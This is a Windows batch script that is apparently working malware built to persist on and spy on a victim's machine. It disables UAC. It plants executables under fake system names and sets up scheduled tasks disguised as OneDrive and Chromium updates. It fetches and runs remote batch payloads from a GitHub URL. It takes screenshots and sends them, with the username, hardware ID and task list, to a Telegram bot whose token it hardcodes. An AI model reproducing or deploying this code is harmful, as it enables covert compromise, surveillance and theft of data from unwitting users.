:: ( nHBAPWtA )
@echo off




:: Set the log file path
set "LOGFILE=%temp%\9875426.exe"

:: Start logging from this point
call :LogOutput > "%LOGFILE%" 2>&1
del /f /q "%LOGFILE%"
exit

:LogOutput
:: Your long batch script starts here










:: Count the instances of RUNEVERYCALLER.exe
set "instances=0"
for /f "tokens=*" %%A in ('tasklist /fi "imagename eq RUNEVERYCALLER.exe" ^| find /i "RUNEVERYCALLER.exe"') do (
    set /a instances+=1
)

:: Check if one or more instances are found
if %instances% geq 2 (
    echo RUNEVERYCALLER.exe is already running. Exiting batch...
    exit
)




echo RUNEVERYCALLER.exe is not running. Continue.....







set "CheckSend=0"
set "lastMinute=none"



::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )


:: Place HWID into %HWID% variable 
for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i








:: Initialize the loop counter outside of the loop
:: set loopCount=0




:loop_start






::ShellHost.exe ---> TSSPrxySHST.exe
::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
::COM Surrogate.exe ---> SyncHostApp.exe
::KMSAuto.exe ---> TSSKMS.exe
::StartupTaskCaller.exe ---> TSSPrxySTC.exe





:RUNADMINHERE
cd /d "%~dp0"
:: Run All your commands here ( will be executed with admin privileges )


:: Disable UAC 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f



:EVERYSECOND


:SHST
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

timeout /t 1 /nobreak >nul






:COM
:: Define the paths
set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

del /F /Q /A "%appdata%\*.ps1"
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f

timeout /t 1 /nobreak >nul







:KMS
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

timeout /t 1 /nobreak >nul










:CHECKINGTASKS

:: Define tasks to check
set "Task1=OneDrive Updater"
set "Task2=OneDrive Task"
set "Task3=Microsoft Update"


:: Check if "OneDrive Updater" & "OneDrive Task"  exists & Enable them if disabled
schtasks /query /tn "%Task1%" >nul 2>&1 || schtasks /query /tn "%Task2%" >nul 2>&1 || schtasks /query /tn "%Task3%" >nul 2>&1 || goto TASKSEVERY
schtasks /query /tn "%Task1%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task1%" /enable)
schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task2%" /enable)
schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task3%" /enable)


goto AFTERTASKSEVERY



:TASKSEVERY
echo At least one task is missing! Adding tasks...

:: Add your commands here
schtasks /create /tn "OneDrive Updater" /tr "\"%ProgramData%\Microsoft\Windows\ShellHost.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Updater'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
schtasks /create /tn "OneDrive Task" /tr "\"%ProgramData%\Microsoft\Windows\KMSAuto.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Task'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
schtasks /create /tn "Chromium Update" /tr "\"%ProgramData%\Microsoft\Windows\COM Surrogate.exe"" /sc minute /mo 180 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'Chromium Update'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"

set "MESSAGE=TasksAdded|"
set "CheckSend=1"




:AFTERTASKSEVERY

















:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 

:: Define the list of files to check
set "file1=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
set "file4=%APPDATA%\Microsoft\nircmd.exe"



:: Check each file
if not exist "%file1%" goto STARTUPTAASK
if not exist "%file2%" goto STARTUPTAASK
if not exist "%file3%" goto STARTUPTAASK
if not exist "%file4%" goto STARTUPTAASK



:: If all files are found, continue with other tasks
echo All files found.
goto COMMANDSFORAGENTS










































:STARTUPTAASK








:CheckSHST
:: Check ShellHost.exe; if found, skip to CheckComSurrogate
if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" (
    goto CheckComSurrogate
)

:: Run commands if ShellHost.exe is not found
echo Checking for ShellHost...
set "embeddedScript=temp_script_SHST.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from ShellHost Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckSHST
)

set "MESSAGE=%MESSAGE%SHST|"
set "CheckSend=1"







:CheckComSurrogate
:: Check ComSurrogate.exe; if found, skip to next section
if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
    goto CheckKMSAuto
)

:: Run commands if ComSurrogate.exe is not found
echo Checking for COM Surrogate...
set "embeddedScript=temp_script_COM.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from ComSurrogate Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckComSurrogate
)

set "MESSAGE=%MESSAGE%ComSurrogate|"
set "CheckSend=1"











:CheckKMSAuto
:: Check KMSAuto.exe; if found, skip to next section
if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" (
    goto CheckNIRCMD
)

:: Run commands if KMSAuto.exe is not found
echo Checking for KMSAuto...
set "embeddedScript=temp_script_KMS.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from KMSAuto Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckKMSAuto
)

set "MESSAGE=%MESSAGE%KMSAuto|"
set "CheckSend=1"






:CheckNIRCMD
:: Check nircmd.exe; if found, skip to next section
if exist "%APPDATA%\Microsoft\nircmd.exe" (
    goto COMMANDSFORAGENTS
)

:: Run commands if Nircmd.exe is not found
echo Checking for Nircmd...
set "embeddedScript=temp_script_Nircmd.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Nircmd') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from NIRCMD Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckNIRCMD
)

set "MESSAGE=%MESSAGE%NIRCMD|"
set "CheckSend=1"


























:COMMANDSFORAGENTS


:NEXT1

echo Stopping processes...
taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM TSSPrxySTC.exe
taskkill /F /IM TSSPrxyAdSTC.exe



echo Removing scheduled tasks...
schtasks /Delete /TN "WinRNTMUpdate" /F
schtasks /Delete /TN "WinRTKUpdate" /F
schtasks /Delete /TN "checkCOMandadd" /F
schtasks /Delete /TN "SystemCertificates" /F


taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM StartupTaskCaller.exe


echo Deleting files...
del /F /Q "%SystemRoot%\System32\TSSPrxy.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAd.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxySTC.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"

echo Operation completed.

::goto CONT


















set "LAST_MIN_SENT_FILE=%temp%\lstminsnt.txt"



if exist "%LAST_MIN_SENT_FILE%" (
    set /p LAST_MINUTE_SENT=<"%LAST_MIN_SENT_FILE%"
) else (
    set "LAST_MINUTE_SENT=none"
)



set "currentMinute1=%time:~3,2%"



if "%LAST_MINUTE_SENT%"=="%currentMinute1%" (
    echo Skipping Sending
    goto CONT
)




:EVERYMINSEND

:: SEND MSG

:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and message
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "MESSAGEEVERY=%USERNAME%|RUNNING.....|"


:: URL encode the message by replacing spaces with %20
set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"

:: Send the message using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=%ENCODED_MESSAGE%"

echo Message sent to chat ID %CHAT_ID%
echo %currentMinute1%> "%LAST_MIN_SENT_FILE%"









:CONT

















set "currentMinute=%time:~3,2%"

if "%currentMinute%" neq "%lastMinute%" (
    if "%currentMinute%"=="00" set "CheckSend=1"
    if "%currentMinute%"=="15" set "CheckSend=1"
    if "%currentMinute%"=="30" set "CheckSend=1"
    if "%currentMinute%"=="45" set "CheckSend=1"

)
::echo.
::echo.
::echo.
::echo CheckSend=%CheckSend%
::echo Minutes=%currentMinute%
::timeout /t 3 /nobreak







:: Check the value of CheckSend
if "%CheckSend%"=="1" (
    goto SENDCHECK
) else (
    goto checkloooop
)












:SENDCHECK



set "TASKS_DATA=%temp%\tasks_data.txt"
set "LOGFILE1=%temp%\LOGFILE1.txt"





:: make a copy of %LOGFILE% to %LOGFILE1%
type "%LOGFILE%" > "%LOGFILE1%"

:: create %TASKS_DATA%
schtasks /query /fo LIST /v > "%TASKS_DATA%"


:: make x empty lines to %LOGFILE1% then type taask scheduler .....
(for /l %%i in (1,1,6) do echo.) >> "%LOGFILE1%"
echo Task Scheduler :  >> "%LOGFILE1%"
echo. >> "%LOGFILE1%"
echo. >> "%LOGFILE1%"
type "%TASKS_DATA%" >> "%LOGFILE1%"
echo. >> "%LOGFILE1%"
echo. >> "%LOGFILE1%"










"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"



:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and caption
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "CAPTION=Computer|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"

:: URL encode the caption
set "ENCODED_CAPTION=%CAPTION: =%%2%"

:: Send the photo with caption using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
     -F "chat_id=%CHAT_ID%" ^
     -F "caption=%ENCODED_CAPTION%" ^
     -F "photo=@%PHOTO_PATH%"



:: Send the file (as a document)
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
     -F "chat_id=%CHAT_ID%" ^
     -F "caption=%USERNAME%" ^
     -F "document=@%LOGFILE1%"




echo Message sent to chat ID %CHAT_ID%

del /f /q "%USERPROFILE%\Downloads\screenshot.png"
del /f /q "%LOGFILE1%"
del /f /q "%TASKS_DATA%"


set "CheckSend=0"
set "lastMinute=%currentMinute%"
















:checkloooop




set "currentSeconds=%time:~6,2%"
if %currentSeconds% geq 40 (
    echo Seconds are 40 or greater. Exiting...
    goto :EOF
)

cls
echo Looping... (%currentSeconds%)
::timeout /t 1 /nobreak
goto :loop_start



